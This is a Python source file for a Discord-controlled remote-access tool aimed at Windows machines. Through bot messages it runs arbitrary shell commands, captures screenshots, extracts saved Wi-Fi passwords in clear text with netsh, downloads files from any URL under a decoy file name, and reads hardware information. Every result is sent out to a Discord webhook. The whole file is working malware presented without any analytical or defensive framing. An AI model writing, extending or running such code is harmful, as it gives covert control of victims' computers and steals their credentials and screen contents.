import os
import time
import subprocess
import pyautogui
import datetime
import discord
from discord_webhook import DiscordWebhook
import wmi
import requests

from dotenv import load_dotenv
load_dotenv()



TOKEN = os.getenv("BOT_TOKEN")

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('command'):
        await message.channel.send('Sent command!')
        command = message.content
        command = command.replace('command ', '')
        # os.system(command)
        hmm = subprocess.run(command, capture_output=True, text=True)
        out = hmm.stdout
        out = out.replace('Ã', '├')
        out = out.replace('Ä', '─')
        print(out)
        #webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content=out)
        #response = webhook.execute()
        
        
        chunklength = 2000
        chunks = [out[i:i+chunklength ] for i in range(0, len(out), chunklength )]
        for chunk in chunks: 
            webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content=chunk)
            response = webhook.execute()
        
        
        
        
        
        
        
        
        
        
        
       
    
    elif message.content.startswith('com'):
        await message.channel.send('Sent command!')
        command = message.content
        command = command.replace('com ', '')
        os.system(command)
        
        
        
        
        
    elif message.content.startswith('screenshot'):
        time_now = datetime.datetime.now()
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save("help.png")
        webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="Screenshot taken at " + str(time_now))
        with open("./help.png", "rb") as f:
            webhook.add_file(file=f.read(), filename="help.png")
        response = webhook.execute()
        os.remove("./help.png")

        
    elif message.content.startswith('wifi'):
        networks, out = [], ''
        wifis = []
        try:
            wifi = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
            wifi = [i.split(":")[1][1:-1]
                    for i in wifi if "All User Profile" in i]
            wifis = len(networks)
            for name in wifi:
                try:
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1]
                                for b in results if "Key Content" in b]
                    
                except subprocess.CalledProcessError:
                    networks.append((name, ''))
                    continue

                try:
                    networks.append((name, results[0]))
                except IndexError:
                    networks.append((name, ''))

        except subprocess.CalledProcessError:
            pass
        except UnicodeDecodeError:
            pass

        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
        out += f'{"-"*20}|{"-"*29}\n'
        for name, password in networks:
            out += '{:<20}| {:<}\n'.format(name, password)
        webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="`"+ out + "`")
        response = webhook.execute()


        
    elif message.content.startswith('download'):
        command = message.content
        command = command.replace('download ', '')
        webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="Downloading!")
        response = webhook.execute()
    
        url = command
        r = requests.get(url, allow_redirects=True)
        open('facebook.ico', 'wb').write(r.content)
        

    elif message.content.startswith('sys'):
            command = message.content
            command = command.replace('sys ', '')
            cpu = wmi.WMI().Win32_Processor()[0].Name
            gpu = wmi.WMI().Win32_VideoController()[0].Name
            ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                        0].TotalVisibleMemorySize) / 1048576, 0)
            webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="`" + "CPU: " + str(cpu) + "\nGPU: " + str(gpu) + "\nRAM: " + str(ram) + "GB" + "`")
            response = webhook.execute()
        

client.run(TOKEN)